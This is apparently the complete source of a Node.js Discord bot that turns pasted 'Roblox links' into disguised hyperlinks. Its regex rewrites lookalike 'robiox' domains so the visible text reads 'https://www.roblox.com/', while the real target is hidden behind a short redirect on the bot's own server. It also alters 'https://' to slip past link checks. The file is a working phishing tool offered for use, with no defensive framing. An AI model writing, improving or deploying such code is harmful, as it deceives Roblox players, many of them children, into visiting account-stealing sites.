require('dotenv').config();
const { Client, GatewayIntentBits, ActionRowBuilder, ModalBuilder, TextInputBuilder, TextInputStyle, MessageFlags } = require('discord.js');
const express = require('express');
const app = express();

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] });
const linksDb = {};

app.get('/', (req, res) => {
    res.send('Bot is active!');
});

app.get('/r/:id', (req, res) => {
    const originalUrl = linksDb[req.params.id];
    console.log(`?? Redirecting ID: ${req.params.id}, link: ${originalUrl}`);
    if (originalUrl) {
        return res.redirect(originalUrl);
    }
    res.status(404).send('Link not found or expired');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`?? Web server running on port ${PORT}`));

client.once('ready', () => console.log(`? Bot ${client.user.tag} is ready!`));

client.on('interactionCreate', async (interaction) => {
    if (interaction.isButton() && interaction.customId === 'create_hyperlink') {
        const modal = new ModalBuilder().setCustomId('link_modal').setTitle('Create Hidden Link');
        const input = new TextInputBuilder()
            .setCustomId('url_input')
            .setLabel('Paste Roblox link')
            .setStyle(TextInputStyle.Short)
            .setPlaceholder('https://www.roblox.com/...')
            .setRequired(true);
        
        modal.addComponents(new ActionRowBuilder().addComponents(input));
        await interaction.showModal(modal);
    }

    if (interaction.isModalSubmit() && interaction.customId === 'link_modal') {
        const url = interaction.fields.getTextInputValue('url_input');
        const id = Math.random().toString(36).substring(7);
        linksDb[id] = url;
        
        const shortUrl = `${process.env.BASE_URL}/r/${id}`;
        const visualUrl = url.replace(/https?:\/\/(robiox|roblox)[a-z0-9.-]+(\/|$)/i, 'https://www.roblox.com/').replace('https://', 'https_:_//');

        // Ответ в канале
        await interaction.reply({ 
            content: `<a:verify:1513286049638518824> Check your DMs!`, 
            flags: [MessageFlags.Ephemeral] 
        });

        // Отправка в ЛС
        try {
            await interaction.user.send({
                embeds: [{
                    color: 0x274666,
                    title: '🔗 Hyperlink Generated',
                    description: '👇Your link is ready!\n\n🖱️Click on the code block below to copy it'
                }]
            });

            // ЧИСТЫЙ ВАРИАНТ — именно так, как ты хочешь
            await interaction.user.send({
                content: `[\`${visualUrl}\`](${shortUrl})`
            });

        } catch (error) {
            console.error('Failed to send DM:', error);
            await interaction.followUp({
                content: `⚠️ Failed to send DM. Here is your link: [\`${visualUrl}\`](${shortUrl})`,
                flags: [MessageFlags.Ephemeral]
            });
        }
    }
});

client.login(process.env.TOKEN);
